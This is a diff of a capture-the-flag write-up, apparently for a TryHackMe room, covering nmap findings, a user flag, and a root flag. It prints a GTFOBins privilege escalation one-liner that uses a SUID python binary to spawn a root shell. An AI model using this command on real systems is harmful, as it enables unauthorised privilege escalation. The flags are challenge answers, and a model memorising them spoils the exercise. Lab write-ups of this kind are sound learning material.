@@ -48,14 +48,14 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ### What Apache version is running?
 
-####With **nmap**
+#### With **nmap**
 ```
 2.4.29
 ```
 
 ### What service is running on port 22?
 
-####With **nmap**
+#### With **nmap**
 ```
 ssh
 ```
@@ -69,9 +69,9 @@ ssh
 
 ## Getting a shell
 
-###user.txt
+### user.txt
 ```
-
+THM{y0u_g0t_a_sh3ll}
 ```
 
 ## Priv esc
@@ -84,8 +84,7 @@ ssh
 ### root.txt
 
 #### website **gtfobins.github.io**
-#### command **./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-**
+#### command **./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'**
 
 ```
 THM{pr1v1l3g3_3sc4l4t10n}
